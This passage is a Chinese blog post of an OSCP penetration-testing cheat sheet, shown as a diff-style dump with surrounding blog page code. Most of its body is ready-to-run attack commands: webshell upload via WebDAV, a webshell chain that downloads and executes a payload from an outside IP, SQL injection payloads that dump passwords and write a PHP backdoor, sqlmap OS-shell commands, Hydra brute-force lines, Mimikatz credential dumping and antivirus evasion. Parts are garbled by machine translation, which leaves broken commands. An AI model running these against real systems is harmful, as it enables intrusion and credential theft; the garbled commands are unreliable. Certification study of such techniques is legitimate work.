+ timeout 1
+ echo
+</code></pre><p>可以使用以下语法运行该文件：</p>
+<p><code>C:\temp\cscript.exe webdl.vbs</code></p>
+</li>
+<li><p>挂载文件共享</p>
+<ul>
+<li>将NFS共享<br>挂载到/ mnt / nfs 挂载$ ip：/ vol / share / mnt / nfs</li>
+</ul>
+</li>
+<li><p>HTTP Put<br>nmap -p80 $ ip –script http-put –script-args http-put.url =’/ test / sicpwn.php’，http-put.file =’/ var / www / html / sicpwn.php</p>
+</li>
+</ul>
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><ul>
+<li><ul>
+<li><p>SCP</p>
+<p>scp用户名1 @ source_host：目录1 /文件名1用户名2 @ destination_host：目录2 /文件名2</p>
+<p>scp localfile用户名@ $ ip：〜/文件夹/</p>
+<p>scp Linux_Exploit_Suggester.pl <a href="mailto:bob@192.168.1.10">bob@192.168.1.10</a>：〜</p>
+</li>
+<li><p>使用Davtest的Webdav-一些系统管理员足以启用PUT方法-此工具将自动上传后门</p>
+<p><code>davtest -move -sendbd auto -url http://$ip</code></p>
+<p><a href="http://web.archive.org/web/20171113221652/https://github.com/cldrn/davtest" target="_blank" rel="noopener">https://github.com/cldrn/davtest</a></p>
+<p>您还可以使用带有curl命令的PUT方法上传文件：</p>
+<p><code>curl -T &#39;leetshellz.txt&#39; &#39;http://$ip&#39;</code></p>
+<p>并使用带有curl命令的MOVE方法将其重命名为可执行文件：</p>
+<p><code>curl -X MOVE --header &#39;Destination:http://$ip/leetshellz.php&#39; &#39;http://$ip/leetshellz.txt&#39;</code></p>
+</li>
+<li><p>使用有限的php shell cmd上传shell，使用<br>webshel​​l下载并执行meterpreter<br>[curl -s –data“ cmd = wget  <a href="http://web.archive.org/web/20171113221652/http://174.0.42.42:8000/dhn" target="_blank" rel="noopener">http://174.0.42.42:8000/dhn</a>  -O / tmp / evil” http：// $ ip / files / sh.php<br>[curl -s –data“ cmd = chmod 777 / tmp / evil” http：//$ip/files/sh.php<br>curl -s –data“ cmd = bash -c / tmp /evil”http://$ip/files/sh.php</p>
+</li>
+<li><p>TFTP<br>mkdir / tftp<br>atftpd-守护进程-端口69 / tftp<br>cp /usr/share/windows-binaries/nc.exe / tftp /<br>EX。从WINDOWS主机：<br>C：\ Users \ Offsec&gt; tftp -i $ ip get nc.exe</p>
+</li>
+<li><p>FTP<br>apt-get更新&amp;&amp; apt-get安装pure-ftpd</p>
+<p>＃！/ bin / bash<br>groupadd ftpgroup<br>useradd -g ftpgroup -d / dev / null -s / etc ftpuser<br>pure-pw useradd offsec -u ftpuser -d / ftphome<br>pure-pw mkdb<br>cd / etc / pure-ftpd / auth /<br>ln -s ../conf/PureDB 60pdb<br>mkdir -p / ftphome<br>chown -R ftpuser：ftpgroup / ftphome /</p>
+<p>/etc/init.d/pure-ftpd重新启动</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="压缩打包文件"><a href="#压缩打包文件" class="headerlink" title="压缩打包文件"></a>压缩打包文件</h3><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h3><h3 id="Windows提权"><a href="#Windows提权" class="headerlink" title="Windows提权"></a>Windows提权</h3><h2 id="客户端、网页及密码攻击"><a href="#客户端、网页及密码攻击" class="headerlink" title="客户端、网页及密码攻击"></a>客户端、网页及密码攻击</h2><h3 id="客户端攻击"><a href="#客户端攻击" class="headerlink" title="客户端攻击"></a>客户端攻击</h3><h3 id="网络攻击"><a href="#网络攻击" class="headerlink" title="网络攻击"></a>网络攻击</h3><h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><h3 id="数据库漏洞"><a href="#数据库漏洞" class="headerlink" title="数据库漏洞"></a>数据库漏洞</h3><ul>
+<li><p>身份验证绕过</p>
+<pre><code>  name=&#39;wronguser&#39; or 1=1;  
+  name=&#39;wronguser&#39; or 1=1 LIMIT 1;
+</code></pre></li>
+<li><p>枚举数据库</p>
+<p><code>http://192.168.11.35/comment.php?id=738)&#39;</code></p>
+<p>详细错误消息？</p>
+<p><code>http://$ip/comment.php?id=738 order by 1</code></p>
+<p><code>http://$ip/comment.php?id=738 union all select 1,2,3,4,5,6</code></p>
+<p>确定MySQL版本：</p>
+<p><code>http://$ip/comment.php?id=738 union all select 1,2,3,4,@@version,6</code></p>
+<p>用于数据库连接的当前用户：</p>
+<p><code>http://$ip/comment.php?id=738 union all select 1,2,3,4,user(),6</code></p>
+<p>枚举数据库表和列结构</p>
+<p><code>http://$ip/comment.php?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables</code></p>
+<p>定位数据库中的用户表</p>
+<p><code>http://$ip/comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name=&#39;users&#39;</code></p>
+<p>提取名称和密码</p>
+<p><code>http://$ip/comment.php?id=738 union select 1,2,3,4,concat(name,0x3a, password),6 FROM users</code></p>
+<p>创建后门</p>
+<p><code>http://$ip/comment.php?id=738 union all select 1,2,3,4,&quot;&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;&quot;,6 into OUTFILE &#39;c:/xampp/htdocs/backdoor.php&#39;</code></p>
+</li>
+<li><p>SQLMAP实例</p>
+</li>
+<li><p>爬网</p>
+<p><code>sqlmap -u http://$ip --crawl=1</code></p>
+<p><code>sqlmap -u http://meh.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3</code></p>
+</li>
+<li><p>SQLMap针对可疑的GET SQL注入搜索数据库</p>
+<p><code>sqlmap –u http://$ip/blog/index.php?search –dbs</code></p>
+</li>
+<li><p>GET SQL注入时从数据库oscommerce的SQLMap转储表</p>
+<p><code>sqlmap –u http://$ip/blog/index.php?search= –dbs –D oscommerce –tables –dumps</code></p>
+</li>
+<li><p>SQLMap GET参数命令</p>
+<p><code>sqlmap -u http://$ip/comment.php?id=738 --dbms=mysql --dump -threads=5</code></p>
+</li>
+<li><p>SQLMap发布用户名参数</p>
+<p><code>sqlmap -u http://$ip/login.php --method=POST --data=&quot;usermail=asc@dsd.com&amp;password=1231&quot; -p &quot;usermail&quot; --risk=3 --level=5 --dbms=MySQL --dump-all</code></p>
+</li>
+<li><p>SQL Map OS Shell</p>
+<p><code>sqlmap -u http://$ip/comment.php?id=738 --dbms=mysql --osshell</code></p>
+<p><code>sqlmap -u http://$ip/login.php --method=POST --data=&quot;usermail=asc@dsd.com&amp;password=1231&quot; -p &quot;usermail&quot; --risk=3 --level=5 --dbms=MySQL --os-shell</code></p>
+</li>
+<li><p>自动化sqlmap扫描</p>
+<p><code>sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read=&quot;/var/www/blah.php&quot;</code></p>
+</li>
+<li><p>有针对性的sqlmap扫描</p>
+<p><code>sqlmap -u &quot;http://meh.com/meh.php?id=1&quot; --dbms=mysql --tech=U --random-agent --dump</code></p>
+</li>
+<li><p>使用mysql后端扫描URL进行联合+基于错误的注入，并使用随机用户代理+数据库转储</p>
+<p><code>sqlmap -o -u http://$ip/index.php --forms --dbs</code></p>
+<p><code>sqlmap -o -u &quot;http://$ip/form/&quot; --forms</code></p>
+</li>
+<li><p>Sqlmap注入检查表</p>
+<p><code>sqlmap -o -u &quot;http://$ip/vuln-form&quot; --forms -D database-name -T users --dump</code></p>
+</li>
+<li><p>枚举数据库</p>
+<p><code>sqlmap --dbms=mysql -u &quot;$URL&quot; --dbs</code></p>
+</li>
+<li><p>枚举特定数据库中的表</p>
+<p><code>sqlmap --dbms=mysql -u &quot;$URL&quot; -D &quot;$DATABASE&quot; --tables</code></p>
+</li>
+<li><p>从特定的数据库和表中转储表数据</p>
+<p><code>sqlmap --dbms=mysql -u &quot;$URL&quot; -D &quot;$DATABASE&quot; -T &quot;$TABLE&quot; --dump</code></p>
+</li>
+<li><p>指定要利用的参数</p>
+<p><code>sqlmap --dbms=mysql -u &quot;http://www.example.com/param1=value1&amp;param2=value2&quot; --dbs -p param2</code></p>
+</li>
+<li><p>指定要在“好的” URI中利用的参数（利用param1）</p>
+<p><code>sqlmap --dbms=mysql -u &quot;http://www.example.com/param1/value1*/param2/value2&quot; --dbs</code></p>
+</li>
+<li><p>获取操作系统外壳</p>
+<p><code>sqlmap --dbms=mysql -u &quot;$URL&quot; --os-shell</code></p>
+</li>
+<li><p>获取SQL shell</p>
+<p><code>sqlmap --dbms=mysql -u &quot;$URL&quot; --sql-shell</code></p>
+</li>
+<li><p>SQL查询</p>
+<p><code>sqlmap --dbms=mysql -u &quot;$URL&quot; -D &quot;$DATABASE&quot; --sql-query &quot;SELECT * FROM $TABLE;&quot;</code></p>
+</li>
+<li><p>使用Tor Socks5代理</p>
+<p><code>sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u &quot;$URL&quot; --dbs</code></p>
+</li>
+</ul>
+<h3 id="密码攻击"><a href="#密码攻击" class="headerlink" title="密码攻击"></a>密码攻击</h3><ul>
+<li><p>Mimikatz</p>
+<ul>
+<li><p>extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. mimikatz can also perform pass-the-hash, pass-the-ticket or build Golden tickets<br><a href="http://web.archive.org/web/20171113221652/https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener"><em>https://github.com/gentilkiwi/mimikatz</em></a> From metasploit meterpreter (must have System level access):</p>
+<pre><code>meterpreter&gt; load mimikatz
+meterpreter&gt; help mimikatz
+meterpreter&gt; msv
+meterpreter&gt; kerberos
+meterpreter&gt; mimikatz_command -f samdump::hashes
+meterpreter&gt; mimikatz_command -f sekurlsa::searchPasswords
+</code></pre></li>
+</ul>
+</li>
+<li><p>Hydra</p>
+<ul>
+<li><p>Hydra brute force against SNMP    //暴力破解</p>
+<p><code>hydra -P password-file.txt -v $ip snmp</code></p>
+</li>
+<li><p>Hydra FTP known user and rockyou password list</p>
+<p><code>hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp</code></p>
+</li>
+<li><p>Hydra SSH using list of users and passwords</p>
+<p><code>hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh</code></p>
+</li>
+<li><p>Hydra SSH using a known password and a username list</p>
+<p><code>hydra -v -V -u -L users.txt -p &quot;&lt;known password&gt;&quot; -t 1 -u $ip ssh</code></p>
+</li>
+<li><p>Hydra SSH Against Known username on port 22</p>
+<p><code>hydra $ip -s 22 ssh -l &lt;user&gt; -P big_wordlist.txt</code></p>
+</li>
+<li><p>Hydra POP3 Brute Force</p>
+<p><code>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V</code></p>
+</li>
+<li><p>Hydra SMTP Brute Force</p>
+<p><code>hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V</code></p>
+</li>
+<li><p>Hydra attack http get 401 login with a dictionary</p>
+<p><code>hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin</code></p>
+</li>
+<li><p>Hydra attack Windows Remote Desktop with rockyou</p>
+<p><code>hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip</code></p>
+</li>
+<li><p>Hydra brute force SMB user with rockyou:</p>
+<p><code>hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb</code></p>
+</li>
+<li><p>Hydra brute force a Wordpress admin login</p>
+<p><code>hydra -l admin -P ./passwordlist.txt $ip -V http-form-post &#39;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location&#39;</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="密码哈希攻击"><a href="#密码哈希攻击" class="headerlink" title="密码哈希攻击"></a>密码哈希攻击</h3><ul>
+<li><p>在线密码破解<br><a href="http://web.archive.org/web/20171113221652/https://crackstation.net/" target="_blank" rel="noopener"><em>https://crackstation.net/</em> </a> <a href="http://web.archive.org/web/20171113221652/http://finder.insidepro.com/" target="_blank" rel="noopener"><em>http://finder.insidepro.com/</em></a></p>
+</li>
+<li><p>Hashcat需要安装新的驱动程序才能使我的GPU Cracking在Kali linux VM上运行，并且我还必须使用–force参数。</p>
+<pre><code>apt-get install libhwloc-dev ocl-icd-dev ocl-icd-opencl-dev
+</code></pre><p>和</p>
+<pre><code>apt-get install pocl-opencl-icd
+</code></pre></li>
+</ul>
+<h2 id="网络隧道，端口转发"><a href="#网络隧道，端口转发" class="headerlink" title="网络隧道，端口转发"></a>网络隧道，端口转发</h2><h2 id="Metasploit框架"><a href="#Metasploit框架" class="headerlink" title="Metasploit框架"></a>Metasploit框架</h2><ul>
+<li><p>Metasploit</p>
+<ul>
+<li><p>MetaSploit需要Postfresql</p>
+<p><code>systemctl start postgresql</code></p>
+</li>
+<li><p>在启动时启用Postgresql</p>
+<p><code>systemctl enable postgresql</code></p>
+</li>
+</ul>
+</li>
+<li><p>MSF语法</p>
+<ul>
+<li><p>开始metasploit</p>
+<p><code>msfconsole</code></p>
+<p><code>msfconsole -q</code></p>
+</li>
+<li><p>显示命令帮助</p>
+<p><code>show -h</code></p>
+</li>
+<li><p>显示辅助模块</p>
+<p><code>show auxiliary</code></p>
+</li>
+<li><p>使用模块</p>
+<pre><code>use auxiliary/scanner/snmp/snmp_enum  
+use auxiliary/scanner/http/webdav_scanner  
+use auxiliary/scanner/smb/smb_version  
+use auxiliary/scanner/ftp/ftp_login  
+use exploit/windows/pop3/seattlelab_pass
+</code></pre></li>
+<li><p>显示模块的基本信息</p>
+<p><code>info</code></p>
+</li>
+<li><p>显示模块的配置参数</p>
+<p><code>show options</code></p>
+</li>
+<li><p>设置模块的选项</p>
+<pre><code>set RHOSTS 192.168.1.1-254  
+set THREADS 10
+</code></pre></li>
+<li><p>运行模块</p>
+<p><code>run</code></p>
+</li>
+<li><p>执行漏洞利用</p>
+<p><code>exploit</code></p>
+</li>
+<li><p>搜索模块</p>
+<p><code>search type:auxiliary login</code></p>
+</li>
+</ul>
+</li>
+<li><p>Metasploit数据库访问</p>
+<ul>
+<li><p>显示在MSF数据库中发现的所有主机</p>
+<p><code>hosts</code></p>
+</li>
+<li><p>扫描主机并将其存储在MSF数据库中</p>
+<p><code>db_nmap</code></p>
+</li>
+<li><p>在机器上搜索MSF数据库中的特定端口</p>
+<p><code>services -p 443</code></p>
+</li>
+<li><p>利用MSF数据库扫描SMB端口（自动完成的Rhost）</p>
+<p><code>services -p 443 --rhosts</code></p>
+</li>
+</ul>
+</li>
+<li><p>分阶段和非分阶段</p>
+<ul>
+<li>非分段有效负载-是一次完整发送的有效负载</li>
+<li>分阶段-分两部分发送没有足够的缓冲区空间或需要绕过防病毒</li>
+</ul>
+</li>
+</ul>
+<h2 id="绕过防病毒软件"><a href="#绕过防病毒软件" class="headerlink" title="绕过防病毒软件"></a>绕过防病毒软件</h2><ul>
+<li><p>使用软件保护程序加密已知恶意软件</p>
+<ul>
+<li><p>一种这样的开源加密程序称为Hyperion</p>
+<pre><code>cp /usr/share/windows-binaries/Hyperion-1.0.zip   
+解压缩Hyperion-1.0.zip   cd Hyperion-1.0 /   
+i686-w64-mingw32-g ++ Src / Crypter / * .cpp -o   hyperion.exe 
+cp -p / usr /lib/gcc/i686-w64-mingw32/5.3-win32/libgcc_s_sjlj-1.dll 。  
+cp -p /usr/lib/gcc/i686-w64-mingw32/5.3-win32/libstdc++-6.dll 。  
+酒hyperion.exe ../backdoor.exe ../crypted.exe
+</code></pre></li>
+</ul>
+</li>
+</ul>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://github.com/Elinpf/OSCP-survival-guide" target="_blank" rel="noopener">https://github.com/Elinpf/OSCP-survival-guide</a></p>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">uaa</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://827607240.github.io/2020/09/01/OSCP/">https://827607240.github.io/2020/09/01/OSCP/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">uaa</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/OSCP/">
+                                    <span class="chip bg-color">OSCP</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'zJq4EoET2FEb1trGzTayy1uq-gzGzoHsz',
+        appKey: 'oFcTVTBJYrfsIGdYNnoWMVJ9',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2020/09/01/OSCP/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="OSCP指南">
+                        
+                        <span class="card-title">OSCP指南</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            OSCP指南1、kali linux1.1 开启服务systemctl start ssh
+systemctl start apache2开机自启服务
+systemctl enable ssh下载网页
+wget http://www.cis
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-09-01
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            uaa
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/OSCP/">
+                        <span class="chip bg-color">OSCP</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/09/01/Tmux/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="Tmux学习记录">
+                        
+                        <span class="card-title">Tmux学习记录</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            学习使用Tmux我为什么要学习Tmux，我想在命令行模式下同时打开多个终端，以及如何在ssh远程连接时进行翻页，满足我的日常需求。
+简介tmux是一款优秀的终端复用软件，它比Screen更加强大，至于如何强大，网上有大量的文章讨论了这点，本
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-09-01
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            uaa
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Linux/">
+                        <span class="chip bg-color">Linux</span>
+                    </a>
+                    
+                    <a href="/tags/Tmux/">
+                        <span class="chip bg-color">Tmux</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: wiki<br />'
+            + '文章作者: uaa<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4, h5, h6'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4, h5, h6').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
